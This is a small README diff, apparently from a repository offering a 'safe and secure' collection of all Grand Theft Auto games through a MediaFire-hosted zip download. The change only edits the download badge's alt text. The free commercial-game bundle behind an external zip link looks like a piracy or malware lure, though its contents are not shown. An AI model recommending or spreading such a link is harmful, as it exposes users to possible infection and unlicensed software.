@@ -5,7 +5,7 @@ A comprehensive tool that provides a safe and secure collection of all Grand The
 <img width="900" height="548" alt="{56FAEACE-FAEB-4B47-845C-22729E8ABE8E}" src="https://github.com/user-attachments/assets/3656270e-8f76-4340-8965-1c9c079933e7" />
 
 <a href="https://www.mediafire.com/file/psh4u7k0ihl4ytj/GTA+Games.zip/file">
-  <img src="https://img.shields.io/badge/Download-GTA%20Games-blue?style=for-the-badge" alt="Download GTA Games">
+  <img src="https://img.shields.io/badge/Download-GTA%20Games-blue?style=for-the-badge" alt="Download">
 </a>
 
 ## What does it do?
